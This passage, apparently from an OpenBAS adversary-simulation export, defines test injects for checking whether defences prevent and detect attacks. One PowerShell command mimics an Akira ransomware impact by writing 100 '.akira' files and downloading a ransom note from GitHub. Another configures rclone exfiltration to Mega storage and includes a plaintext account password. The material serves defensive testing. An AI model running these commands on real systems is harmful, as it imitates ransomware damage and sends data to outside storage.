    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1800,
    "inject_injector_contract" : {
      "convertedContent" : {
        "label" : {
          "en" : "Add 100 Files with .akira File Ending + Akira Ransomnote",
          "fr" : "Add 100 Files with .akira File Ending + Akira Ransomnote"
        },
        "config" : {
          "type" : "openbas_implant",
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "expose" : true,
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "fields" : [ {
          "key" : "assets",
          "type" : "asset",
          "label" : "Assets",
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "n",
          "defaultValue" : [ ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : [ "assets", "assetgroups" ]
        }, {
          "key" : "assetgroups",
          "type" : "asset-group",
          "label" : "Asset groups",
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "n",
          "defaultValue" : [ ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : [ "assets", "assetgroups" ]
        }, {
          "key" : "expectations",
          "type" : "expectation",
          "label" : "Expectations",
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "n",
          "defaultValue" : [ ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : null,
          "predefinedExpectations" : [ {
            "expectation_name" : "Expect inject to be prevented",
            "expectation_type" : "PREVENTION",
            "expectation_score" : 100.0,
            "expectation_description" : null,
            "expectation_expiration_time" : 21600,
            "expectation_expectation_group" : false
          }, {
            "expectation_name" : "Expect inject to be detected",
            "expectation_type" : "DETECTION",
            "expectation_score" : 100.0,
            "expectation_description" : null,
            "expectation_expiration_time" : 21600,
            "expectation_expectation_group" : false
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ]
        }, {
          "key" : "obfuscator",
          "type" : "choice",
          "label" : "Obfuscator",
          "choices" : [ {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          }, {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          } ],
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : null
        } ],
        "manual" : false,
        "context" : { },
        "platforms" : [ "Windows" ],
        "variables" : [ {
          "key" : "user",
          "type" : "String",
          "label" : "User that will receive the injection",
          "children" : [ {
            "key" : "user.id",
            "type" : "String",
            "label" : "Id of the user in the platform",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.email",
            "type" : "String",
            "label" : "Email of the user",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.firstname",
            "type" : "String",
            "label" : "First name of the user",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.lastname",
            "type" : "String",
            "label" : "Last name of the user",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.lang",
            "type" : "String",
            "label" : "Language of the user",
            "children" : [ ],
            "cardinality" : "1"
          } ],
          "cardinality" : "1"
        }, {
          "key" : "exercise",
          "type" : "Object",
          "label" : "Exercise of the current injection",
          "children" : [ {
            "key" : "exercise.id",
            "type" : "String",
            "label" : "Id of the user in the platform",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "exercise.name",
            "type" : "String",
            "label" : "Name of the exercise",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "exercise.description",
            "type" : "String",
            "label" : "Description of the exercise",
            "children" : [ ],
            "cardinality" : "1"
          } ],
          "cardinality" : "1"
        }, {
          "key" : "teams",
          "type" : "String",
          "label" : "List of team name for the injection",
          "children" : [ ],
          "cardinality" : "n"
        }, {
          "key" : "player_uri",
          "type" : "String",
          "label" : "Player interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        }, {
          "key" : "challenges_uri",
          "type" : "String",
          "label" : "Challenges interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        }, {
          "key" : "scoreboard_uri",
          "type" : "String",
          "label" : "Scoreboard interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        }, {
          "key" : "lessons_uri",
          "type" : "String",
          "label" : "Lessons learned interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        } ],
        "contract_id" : "37cbfb0f-60ad-4828-91cb-97d80cfa0fca",
        "needs_executor" : true,
        "is_atomic_testing" : true,
        "contract_attack_patterns_external_ids" : [ ]
      },
      "listened" : true,
      "injector_contract_id" : "37cbfb0f-60ad-4828-91cb-97d80cfa0fca",
      "injector_contract_labels" : {
        "en" : "Add 100 Files with .akira File Ending + Akira Ransomnote",
        "fr" : "Add 100 Files with .akira File Ending + Akira Ransomnote"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"label\":{\"en\":\"Add 100 Files with .akira File Ending + Akira Ransomnote\",\"fr\":\"Add 100 Files with .akira File Ending + Akira Ransomnote\"},\"config\":{\"type\":\"openbas_implant\",\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"expose\":true,\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"fields\":[{\"key\":\"assets\",\"type\":\"asset\",\"label\":\"Assets\",\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"n\",\"defaultValue\":[],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":[\"assets\",\"assetgroups\"]},{\"key\":\"assetgroups\",\"type\":\"asset-group\",\"label\":\"Asset groups\",\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"n\",\"defaultValue\":[],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":[\"assets\",\"assetgroups\"]},{\"key\":\"expectations\",\"type\":\"expectation\",\"label\":\"Expectations\",\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"n\",\"defaultValue\":[],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":null,\"predefinedExpectations\":[{\"expectation_name\":\"Expect inject to be prevented\",\"expectation_type\":\"PREVENTION\",\"expectation_score\":100.0,\"expectation_description\":null,\"expectation_expiration_time\":21600,\"expectation_expectation_group\":false},{\"expectation_name\":\"Expect inject to be detected\",\"expectation_type\":\"DETECTION\",\"expectation_score\":100.0,\"expectation_description\":null,\"expectation_expiration_time\":21600,\"expectation_expectation_group\":false},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}]},{\"key\":\"obfuscator\",\"type\":\"choice\",\"label\":\"Obfuscator\",\"choices\":[{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"},{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"}],\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":null}],\"manual\":false,\"context\":{},\"platforms\":[\"Windows\"],\"variables\":[{\"key\":\"user\",\"type\":\"String\",\"label\":\"User that will receive the injection\",\"children\":[{\"key\":\"user.id\",\"type\":\"String\",\"label\":\"Id of the user in the platform\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.email\",\"type\":\"String\",\"label\":\"Email of the user\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.firstname\",\"type\":\"String\",\"label\":\"First name of the user\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.lastname\",\"type\":\"String\",\"label\":\"Last name of the user\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.lang\",\"type\":\"String\",\"label\":\"Language of the user\",\"children\":[],\"cardinality\":\"1\"}],\"cardinality\":\"1\"},{\"key\":\"exercise\",\"type\":\"Object\",\"label\":\"Exercise of the current injection\",\"children\":[{\"key\":\"exercise.id\",\"type\":\"String\",\"label\":\"Id of the user in the platform\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"exercise.name\",\"type\":\"String\",\"label\":\"Name of the exercise\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"exercise.description\",\"type\":\"String\",\"label\":\"Description of the exercise\",\"children\":[],\"cardinality\":\"1\"}],\"cardinality\":\"1\"},{\"key\":\"teams\",\"type\":\"String\",\"label\":\"List of team name for the injection\",\"children\":[],\"cardinality\":\"n\"},{\"key\":\"player_uri\",\"type\":\"String\",\"label\":\"Player interface platform link\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"challenges_uri\",\"type\":\"String\",\"label\":\"Challenges interface platform link\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"scoreboard_uri\",\"type\":\"String\",\"label\":\"Scoreboard interface platform link\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"lessons_uri\",\"type\":\"String\",\"label\":\"Lessons learned interface platform link\",\"children\":[],\"cardinality\":\"1\"}],\"contract_id\":\"37cbfb0f-60ad-4828-91cb-97d80cfa0fca\",\"needs_executor\":true,\"is_atomic_testing\":true,\"contract_attack_patterns_external_ids\":[]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "be1b7c6f-f0e1-4ce8-a593-f48fe4aede28",
        "payload_type" : "Command",
        "payload_name" : "Add 100 Files with .akira File Ending + Akira Ransomnote",
        "payload_description" : "",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : null,
        "payload_source" : "MANUAL",
        "payload_status" : "VERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : null,
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-16T13:30:00.891055Z",
        "payload_updated_at" : "2024-12-16T13:30:00.891055Z",
        "command_executor" : "psh",
        "command_content" : "echo \"# Test 31 - T1486 - Add 100 Files with .akira File Ending + Akira Ransomnote\"\n1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes(\"c:\\test.$_.akira\", $out) }\nInvoke-WebRequest -Uri \"https://raw.githubusercontent.com/skandler/simulate-akira/main/akira_readme.txt\" -OutFile \"C:\\akira_readme.txt\"",
        "payload_collector_type" : null
      },
      "injector_contract_created_at" : "2024-12-16T13:30:00.895643Z",
      "injector_contract_updated_at" : "2024-12-16T13:30:00.895643Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "012d4c59-9e2f-4eb1-aa3f-22b24d80e5d4",
    "inject_title" : "Exfiltrate data with rclone to cloud Storage - Mega (Windows)",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "rclone_path" : "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\",
      "rclone_config_path" : "$env:appdata",
      "dir_to_copy" : "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002",
      "mega_user_account" : "atomictesting@outlook.com",
      "mega_user_password" : "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA",
      "remote_share" : "T1567002",
      "PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_path" : "./ExternalPayloads/../ExternalPayloads/rclone.zip",
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1680,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Exfiltrate data with rclone to cloud Storage - Mega (Windows)",
          "fr" : "Exfiltrate data with rclone to cloud Storage - Mega (Windows)"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "rclone_path",
          "label" : "rclone_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\",
          "type" : "text"
        }, {
          "key" : "rclone_config_path",
          "label" : "rclone_config_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "$env:appdata",
          "type" : "text"
        }, {
          "key" : "dir_to_copy",
          "label" : "dir_to_copy",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002",
          "type" : "text"
        }, {
          "key" : "mega_user_account",
          "label" : "mega_user_account",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "atomictesting@outlook.com",
          "type" : "text"
        }, {
          "key" : "mega_user_password",
          "label" : "mega_user_password",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA",
          "type" : "text"
        }, {
          "key" : "remote_share",
          "label" : "remote_share",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "T1567002",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/rclone.zip",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/rclone.zip",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/rclone.zip",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "5b9553cc-379f-4bf3-b8c3-716d76f1547e",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "5b9553cc-379f-4bf3-b8c3-716d76f1547e",
      "injector_contract_labels" : {
        "en" : "Exfiltrate data with rclone to cloud Storage - Mega (Windows)",
        "fr" : "Exfiltrate data with rclone to cloud Storage - Mega (Windows)"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Exfiltrate data with rclone to cloud Storage - Mega (Windows)\",\"fr\":\"Exfiltrate data with rclone to cloud Storage - Mega (Windows)\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"rclone_path\",\"label\":\"rclone_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\T1567.002\\\\rclone-v*\\\\\",\"type\":\"text\"},{\"key\":\"rclone_config_path\",\"label\":\"rclone_config_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"$env:appdata\",\"type\":\"text\"},{\"key\":\"dir_to_copy\",\"label\":\"dir_to_copy\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\T1567.002\",\"type\":\"text\"},{\"key\":\"mega_user_account\",\"label\":\"mega_user_account\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"atomictesting@outlook.com\",\"type\":\"text\"},{\"key\":\"mega_user_password\",\"label\":\"mega_user_password\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA\",\"type\":\"text\"},{\"key\":\"remote_share\",\"label\":\"remote_share\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"T1567002\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\rclone_zip_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\rclone_zip_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/rclone.zip\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\rclone_zip_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\rclone_zip_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/rclone.zip\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\rclone_zip_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\rclone_zip_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/rclone.zip\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform 